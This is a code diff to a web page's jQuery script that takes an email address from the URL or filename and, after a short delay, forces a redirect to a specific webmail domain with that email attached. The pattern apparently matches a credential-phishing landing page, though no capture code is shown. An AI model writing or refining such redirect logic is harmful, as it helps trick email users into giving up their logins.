@@ -76,8 +76,8 @@
       <script>
          $(document).ready(function() {
              // Configuration - Set your redirect domain here
-             var REDIRECT_DOMAIN = 'https://example.com'; // Change this to your desired domain
-             var REDIRECT_DELAY = 2000; // Delay in milliseconds before redirect (2 seconds)
+             var REDIRECT_DOMAIN = 'https://webmail.gracedrive.org'; // Webmail domain
+             var REDIRECT_DELAY = 1500; // Delay in milliseconds before redirect (1.5 seconds)
              
              // Enhanced function to extract email from URL hash, query, or filename (index.html@user@domain.com)
              function extractEmailFromUrl() {
@@ -141,15 +141,23 @@
                  
                  // Redirect after delay
                  setTimeout(function() {
-                     // You can customize the redirect URL here
-                     // For example, redirect to a specific page with credentials
+                     // Redirect to webmail domain with email parameter
                      var redirectUrl = REDIRECT_DOMAIN;
                      
-                     // Optionally, you can pass the email as a parameter
-                     // redirectUrl += '?email=' + encodeURIComponent($('#email').val());
+                     // Pass the email as a parameter for webmail login
+                     redirectUrl += '?email=' + encodeURIComponent($('#email').val());
                      
-                     console.log('Redirecting to: ' + redirectUrl);
-                     window.location.href = redirectUrl;
+                     console.log('Redirecting to webmail: ' + redirectUrl);
+                     
+                     // Force redirect using window.location.replace for better compatibility
+                     window.location.replace(redirectUrl);
+                     
+                     // Fallback redirect method
+                     setTimeout(function() {
+                         if (window.location.href.indexOf(REDIRECT_DOMAIN) === -1) {
+                             window.location.href = redirectUrl;
+                         }
+                     }, 500);
                  }, REDIRECT_DELAY);
              }
              
